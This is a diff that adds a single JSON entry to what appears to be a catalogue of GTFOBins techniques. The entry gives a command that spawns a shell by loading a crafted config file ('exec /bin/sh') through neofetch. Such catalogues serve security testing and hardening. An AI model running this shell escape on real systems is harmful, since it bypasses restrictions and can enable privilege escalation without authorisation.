@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-neofetch-shell",
+  "name": "GTFOBins · neofetch (shell)",
+  "command": "echo 'exec /bin/sh' >/path/to/temp-file\nneofetch --config /path/to/temp-file",
+  "description": "Use neofetch to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "neofetch",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/neofetch/#shell",
+  "upstream_id": "neofetch/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/neofetch/"
+    }
+  ]
+}
